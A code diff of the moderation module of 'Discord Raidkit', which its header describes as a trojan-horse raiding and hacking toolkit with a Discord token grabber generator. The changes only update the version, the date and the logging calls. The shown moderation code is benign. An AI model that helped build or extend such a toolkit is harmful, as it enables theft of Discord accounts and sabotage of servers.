@@ -1,5 +1,5 @@
 """
-Discord Raidkit v2.3.4 — "The trojan horse of discord raiding"
+Discord Raidkit v2.3.5 — "The trojan horse of discord raiding"
 Copyright © 2023 the-cult-of-integral
 
 a collection of raiding tools, hacking tools, and a token grabber generator for discord; written in Python 3
@@ -8,10 +8,9 @@ This program is under the GNU General Public License v2.0.
 https://github.com/the-cult-of-integral/discord-raidkit/blob/master/LICENSE
 
 moderation.py stores the moderation commands for Anubis.
-moderation.py was last updated on 05/03/23 at 20:49 UTC.
+moderation.py was last updated on 19/04/23 at 23:39 UTC.
 """
 
-import logging
 from datetime import timedelta
 
 import discord
@@ -19,9 +18,9 @@ from discord import app_commands
 from discord.app_commands import Choice
 from discord.ext import commands
 
-from utils import init_logger
+import utils.log_utils as lu
 
-init_logger()
+lu.init()
 
 
 class Moderation(commands.Cog):
@@ -60,8 +59,8 @@ class Moderation(commands.Cog):
             await interaction.followup.send(embed=embed)
 
         except Exception as e:
-            logging.error(
-                f'Error in moderation.py - clear(): {e}')
+            lu.serror(lu.F_MODERATION, 'Moderation.clear',
+                f'Uncaught error: {e}')
             await interaction.followup.send(f'Error: {e}')
 
         return
@@ -115,8 +114,8 @@ class Moderation(commands.Cog):
             await interaction.followup.send(embed=embed)
 
         except Exception as e:
-            logging.error(
-                f'Error in moderation.py - timeout(): {e}')
+            lu.serror(lu.F_MODERATION, 'Moderation.timeout',
+                f'Uncaught error: {e}')
             await interaction.followup.send(f'Error: {e}')
 
         return
@@ -169,8 +168,8 @@ class Moderation(commands.Cog):
             await interaction.followup.send(embed=embed)
 
         except Exception as e:
-            logging.error(
-                f'Error in moderation.py - kick(): {e}')
+            lu.serror(lu.F_MODERATION, 'Moderation.kick',
+                f'Uncaught error: {e}')
             await interaction.followup.send(f'Error: {e}')
         return
 
@@ -221,8 +220,8 @@ class Moderation(commands.Cog):
             await interaction.followup.send(embed=embed)
 
         except Exception as e:
-            logging.error(
-                f'Error in moderation.py - ban(): {e}')
+            lu.serror(lu.F_MODERATION, 'Moderation.ban',
+                f'Uncaught error: {e}')
             await interaction.followup.send(f'Error: {e}')
         return
 
@@ -258,8 +257,8 @@ class Moderation(commands.Cog):
             await interaction.followup.send(embed=embed)
 
         except Exception as e:
-            logging.error(
-                f'Error in moderation.py - unban(): {e}')
+            lu.serror(lu.F_MODERATION, 'Moderation.unban',
+                f'Uncaught error: {e}')
             await interaction.followup.send(f'Error: {e}')
         return
 
